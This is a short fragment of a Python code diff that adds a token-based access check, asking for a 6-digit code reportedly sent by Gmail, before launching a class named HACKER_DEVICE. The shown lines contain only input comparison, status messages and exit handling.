+        user_code = input("\033[96mENTER 6-DIGIT SECURITY TOKEN FROM GMAIL: \033[0m").strip()
+        
+        if user_code == secret_code:
+            print("\033[92m\n[+] ACCESS GRANTED. LOADING CORE INTERFACE MODULES...\033[0m")
+            time.sleep(1.5)
+            return True
+        else:
+            print("\033[91m\n[X] ACCESS DENIED: INVALID SECURITY TOKEN STRUCTURE.")
+            sys.exit(0)
+            
+    except KeyboardInterrupt:
+        print("\n[!] Session initiation aborted by developer.")
+        sys.exit(0)
 if __name__ == "__main__":
-    hacker = HACKER_DEVICE()
-    hacker.start()
+    if verify_master_access():
+        hacker = HACKER_DEVICE()
+        hacker.start()
